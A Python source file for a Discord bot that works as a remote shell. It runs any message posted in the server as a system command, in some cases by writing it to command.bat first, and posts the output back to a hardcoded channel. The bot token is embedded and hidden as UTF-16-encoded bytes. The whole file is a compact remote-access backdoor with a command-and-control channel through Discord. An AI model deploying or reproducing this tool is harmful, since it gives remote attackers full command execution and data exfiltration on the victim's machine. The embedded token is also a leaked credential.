import discord
import subprocess as sp

API_TOKEN = b'\xff\xfeM\x00T\x00A\x003\x00N\x00D\x00A\x005\x00M\x00D\x00k\x001\x00M\x00D\x00E\x003\x00M\x00j\x00g\x002\x00O\x00D\x00g\x00z\x00M\x00Q\x00.\x00G\x001\x00J\x00O\x00a\x00n\x00.\x00v\x00R\x00k\x009\x00g\x00V\x00U\x000\x00h\x00K\x000\x00S\x00q\x00x\x007\x00-\x00t\x00O\x00E\x00Y\x000\x00o\x00A\x00S\x00M\x002\x00h\x00T\x00w\x00L\x00s\x00R\x00h\x001\x00l\x00x\x00C\x00U\x00'.decode("utf-16", 'strict')
client = discord.Client(intents=discord.Intents.all())
guild = discord.Guild

@client.event
async def on_message(message):
    if message.author.bot: return

    print(message.content)

    if message.content[0] == "#":
        print(message.content.partition('#')[2])
        open("command.bat", "w+").write(message.content.partition('#')[2])

        channel = client.get_channel(1074088119575519322)

        output = sp.getoutput("command.bat")

        try:
            await channel.send(output)
        except Exception as e:
            print(e)
            open("message.txt", "w+").write(output)
            await channel.send(file=discord.File("message.txt"))

        return

    channel = client.get_channel(1074088119575519322)

    output = sp.getoutput(message.content)

    try:
        await channel.send(output.replace('Ä', '-').replace('À', '-').replace('Ã', '-').replace('³', '-'))
    except Exception as e:
        print(e)
        open("message.txt", "w+").write(output)
        await channel.send(file=discord.File("message.txt"))

client.run(API_TOKEN)
